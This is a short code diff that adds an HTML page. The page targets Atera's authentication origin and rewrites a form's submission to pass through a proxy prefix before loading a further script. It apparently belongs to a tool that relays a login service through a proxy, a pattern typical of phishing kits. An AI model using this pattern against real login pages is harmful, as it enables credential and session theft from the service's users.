@@ -1,0 +1,12 @@
+<html><head>
+<script>
+origin = "https://auth.atera.com"
+
+html_callback = async function() {
+	document.getElementsByClassName("_form-detect-browser-capabilities")[0].action = proxyPrefix + currentURL;
+	document.getElementsByClassName("_form-detect-browser-capabilities")[0].submit();
+};
+</script>
+
+<script defer src="/get_html.js"></script>
+</head></html>
